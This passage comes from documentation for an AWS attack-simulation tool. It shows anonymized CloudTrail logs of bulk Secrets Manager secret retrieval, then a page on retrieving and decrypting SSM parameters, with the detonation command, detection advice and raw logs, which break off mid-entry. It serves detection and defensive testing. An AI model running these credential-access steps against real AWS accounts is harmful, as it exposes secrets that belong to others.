\"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"6f25a056-21bc-4dc0-b19f-ebd556481158\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-7-WNXFB1\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"da3b695c-bf67-4648-af49-2bdfee197c14\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"9d284480-aa0c-4629-ad39-a99aa008322b\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-8-jLR7H1\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8d045085-7bad-401a-9a04-4feba3f1073e\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"a34ac8a9-1314-42b5-abf7-1fde8260e136\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-12-DyLJjP\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a9b70c0d-d32d-41e7-8356-2be543095478\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"84c979ef-40a9-42d6-844c-a472d4d6a2ba\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-10-DyLJjP\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"dbff1b29-c7fb-4fe4-b5ed-24e8794b77fe\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"6d9c4644-a87b-46fa-b76f-2cc62f8f6f64\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-15-SAZN9Q\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0451b1de-e314-437f-a18d-827565e02bc9\",\n      \"eventName\": \"ListSecrets\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"818f243c-bb6b-43b1-9701-5180eecc90d2\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"tag-key\",\n               \"values\": [\n                  \"StratusRedTeam\"\n               ]\n            }\n         ],\n         \"maxResults\": 100\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"99207de2-f8ea-4160-bbe8-22cb14da3a26\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"3f6c8311-bc51-43cf-88b8-5e51f424c1fd\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-4-Rma50d\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d92519e6-b907-4d3a-abb4-d63c9feaee52\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"b1c6113d-e471-456d-9841-c094e4b47618\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-19-fXrpF0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e20f1d5b-f2fa-470f-8d33-8aa43ddb6a23\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"6604143b-2af2-49d6-90bf-1520228a658a\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-1-fXrpF0\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bd52f504-dd75-46cb-a14e-e447612ea736\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"ad14aa03-62ac-4e31-afbb-5bdd640e051e\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-0-28bajb\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2e8dca5a-4e30-4feb-91bd-8a09cd1067a5\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"12e83f12-234a-4ed6-a8a2-49b68a54abde\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-16-JcCztd\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"304c3bc6-5daa-4405-bbee-e6c65d276c20\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"45167e35-4642-41ae-bb82-0c431ce5dd24\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-13-MNjL4W\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"43ebe9e4-8a82-4bd2-b5bc-bf9585c53bca\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"a3376683-89a2-4a39-b490-adeed0bd02c1\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-6-JcCztd\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a05794ec-3c4c-43f6-b302-cce3f6abf05e\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"de58de72-13f4-4f0e-8b23-2f25717ca82b\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-5-fyShdO\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c9efcd4d-a04b-4abe-8fb4-2d954bcfda77\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"c686956f-fd49-433d-bdc7-c2fe91012036\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-3-DyLJjP\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-centraleast-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"879e946f-b912-44e3-9d82-a84ad0b06668\",\n      \"eventName\": \"GetSecretValue\",\n      \"eventSource\": \"secretsmanager.amazonaws.com\",\n      \"eventTime\": \"2024-07-31T12:36:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"903144391865\",\n      \"requestID\": \"7ab119ac-f938-4bcc-86e8-9917493ace97\",\n      \"requestParameters\": {\n         \"secretId\": \"arn:aws:secretsmanager:cn-centraleast-1r:903144391865:secret:stratus-red-team-retrieve-secret-11-OyGWSO\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.201.144.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"secretsmanager.cn-centraleast-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_10e7edf3-5063-4eba-8842-68f83bb52d65\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA1JMTHE9ZMZMWG0MG\",\n         \"accountId\": \"903144391865\",\n         \"arn\": \"arn:aws:iam::903144391865:user/christophe\",\n         \"principalId\": \"AIDA45XCCHPPLELFTIIM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/","title":"Retrieve And Decrypt SSM Parameters","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Credential Access</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#description","title":"Description","text":"<p>Retrieves and decrypts a high number (30) of SSM Parameters available in an AWS region.</p> <p>Warm-up: </p> <ul> <li>Create multiple SSM Parameters</li> </ul> <p>Detonation: </p> <ul> <li>Use ssm:DescribeParameters to list SSM Parameters in the current region</li> <li>Use ssm:GetParameters by batch of 10 (maximal supported value) to retrieve the values of the SSM Parameters</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.credential-access.ssm-retrieve-securestring-parameters\n</code></pre>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#detection","title":"Detection","text":"<p>Identify principals retrieving a high number of SSM Parameters, through CloudTrail's <code>GetParameter</code>  and <code>GetParameters</code> events.  It is especially suspicious when parameters of type <code>SecretString</code> are retrieved, indicated when  <code>requestParameters.withDecryption</code> is set to <code>true</code> in the CloudTrail events.</p> <p>The following may be use to tune the detection, or validate findings:</p> <ul> <li>Principals who do not usually call ssm:GetParameter(s)</li> <li>Attempts to call ssm:GetParameter(s) resulting in access denied errors</li> </ul>"},{"location":"attack-techniques/AWS/aws.credential-access.ssm-retrieve-securestring-parameters/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ssm:DescribeParameters</code></p> </li> <li> <p><code>ssm:GetParameters</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"3c83144c-614c-4979-ad06-b29d4db97c45\",\n      \"eventName\": \"DescribeParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"13846448-4620-4f7a-af9f-f3e8bb7331e4\",\n      \"requestParameters\": {\n         \"maxResults\": 10,\n         \"nextToken\": \"AAEAAWTrG1XzfC+I+cBZdv2e1Y6JxbMPL7ueqKuvIWVzlNmJAAAAAGarqUEtel9rb1/hWoLuU2fulBaFOAdkVl/mZEj6gahZa13rY/NLTIYY7M5dJzOP+lpBWs4Xs9bGXKBNkSuXRdpmHac6HKafIoo/QaeZdw3phYjDbq+RQR7saxp5c/bOWIMtNBYD/A/sd4cnb/986qFM4978kxcqKsA1KSpCzNL187ypwamchw+ENE8Jk6ZLCTv3edGWlUGFZRVIH1Owq+e597P7xLkwkIQHvn8uNFeW7tW6/SNukEbMkSiyJ/0XMXTytqj4Buns0LSigHLelswkOBTE8NZ3aQM1EFjlTl8Lq6LS5Lsv813z4yv1Qo1Wn8iAUhJ72IsTLpYsWnQNAl7smhlKga0N06ueI7CQErvWfHLNR+BsA5U6XJ3KReNmwRHc47BfR7Xo4ibktKGlGCabtUe9X09W7W2X6NtJv/Q3s4ArEczKQk0e3qEx49nZYLmHQs8BJn7QWgATgAAqUWB1bBEKq2NKNFdHNc2P+N4sypbANg8dVi/+fCRZ6JgDom5r/LXSB+lxThU6i4yiCb1EB6kzPXKME2FqeRm2oH+n4KT2qDX9WW5qxNIvSYbHKcPbtxGbZHBZiVdgjQdDxSkc8qCAPQ5cedA18AJ6gQy6sNl/zgs1ILAUErFz6QaWhozFU0FZiBCK6aiNA5czIPIlDld3+DrTKmuf46PmUg/iJym2zQ==\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"250.202.242.232\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.cn-west-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_e1d92b9d-2488-4244-97b4-0a5e914287ba\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAY964QRZ7YSGWGVUH\",\n         \"accountId\": \"933175858973\",\n         \"arn\": \"arn:aws:iam::933175858973:user/christophe\",\n         \"principalId\": \"AIDAGTWHLUXY291EU1ZL\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"cn-west-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a16d52e1-5e70-44da-b1bd-9016cd1b1cb0\",\n      \"eventName\": \"DescribeParameters\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T15:26:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"933175858973\",\n      \"requestID\": \"a94ac3e5-6956-4bd4-ae7a-6c4517865b56\",\n      \"requestParameters\": {\n         \"maxResults\": 10,\n         \"nextToken\": 